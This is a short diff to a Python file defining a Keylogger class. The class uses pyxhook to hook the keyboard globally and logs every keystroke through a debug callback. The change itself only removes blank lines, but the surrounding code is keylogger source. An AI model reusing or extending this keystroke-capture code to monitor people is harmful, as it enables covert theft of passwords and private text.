@@ -11,7 +11,6 @@ def _keydown_callback(key: pyxhook.pyxhook.PyxHookKeyEvent):
 
     logging.debug(chr(key.Ascii))
 
-
 class Keylogger:
     """ 
     Logs key events to a file
@@ -36,7 +35,6 @@ class Keylogger:
 
         # Assign callback for handling key strokes.
         self.manager.KeyDown = _keydown_callback
-
         # Hook the keyboard and start logging.
         self.manager.HookKeyboard()
         self.manager.start()
